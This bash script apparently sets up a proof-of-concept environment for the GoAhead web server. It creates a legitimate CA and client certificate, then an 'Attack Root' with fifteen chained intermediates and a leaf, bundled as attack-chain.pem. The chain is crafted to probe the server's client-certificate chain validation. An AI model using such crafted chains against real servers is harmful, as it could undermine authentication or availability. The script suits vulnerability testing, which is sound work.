#!/bin/bash
set -euo pipefail

D=/etc/goahead/certs
DEPTH=15
mkdir -p "$D"
cd "$D"

openssl req -x509 -newkey rsa:2048 -nodes -days 365 -subj "/CN=goahead-server/O=PoC" \
    -keyout server.key -out server.crt
openssl req -x509 -newkey rsa:2048 -nodes -days 365 -subj "/CN=Trusted CA/O=PoC" \
    -addext "basicConstraints=critical,CA:TRUE" \
    -addext "keyUsage=critical,keyCertSign,cRLSign" \
    -keyout ca.key -out ca.crt
openssl req -newkey rsa:2048 -nodes -subj "/CN=Legit Client/O=PoC" \
    -keyout client-legit.key -out client-legit.csr
openssl x509 -req -days 365 -in client-legit.csr \
    -CA ca.crt -CAkey ca.key -CAcreateserial -out client-legit.crt

cat > v3_ca.cnf <<'EOF'
[v3_ca]
basicConstraints = critical,CA:TRUE
keyUsage = critical,keyCertSign,cRLSign
EOF

openssl req -x509 -newkey rsa:2048 -nodes -days 365 -subj "/CN=Attack Root/O=Evil" \
    -addext "basicConstraints=critical,CA:TRUE" \
    -addext "keyUsage=critical,keyCertSign,cRLSign" \
    -keyout attack-root.key -out attack-root.crt

prev_cert=attack-root.crt
prev_key=attack-root.key
for i in $(seq 1 $DEPTH); do
    openssl req -newkey rsa:2048 -nodes -subj "/CN=Intermediate $i/O=Evil" \
        -keyout "intermediate-$i.key" -out "intermediate-$i.csr"
    openssl x509 -req -days 365 -in "intermediate-$i.csr" \
        -CA "$prev_cert" -CAkey "$prev_key" -CAcreateserial \
        -extfile v3_ca.cnf -extensions v3_ca -out "intermediate-$i.crt"
    prev_cert="intermediate-$i.crt"
    prev_key="intermediate-$i.key"
done

openssl req -newkey rsa:2048 -nodes -subj "/CN=Attack Leaf/O=Evil" \
    -keyout attack-leaf.key -out attack-leaf.csr
openssl x509 -req -days 365 -in attack-leaf.csr \
    -CA "$prev_cert" -CAkey "$prev_key" -CAcreateserial -out attack-leaf.crt

cat attack-leaf.crt > attack-chain.pem
for i in $(seq $DEPTH -1 1); do
    cat "intermediate-$i.crt" >> attack-chain.pem
done
cat attack-root.crt >> attack-chain.pem

exec goahead \
    --auth /etc/goahead/auth.txt \
    --route /etc/goahead/route.txt \
    --log stdout:4 \
    /var/www/goahead \
    "https://0.0.0.0:443"
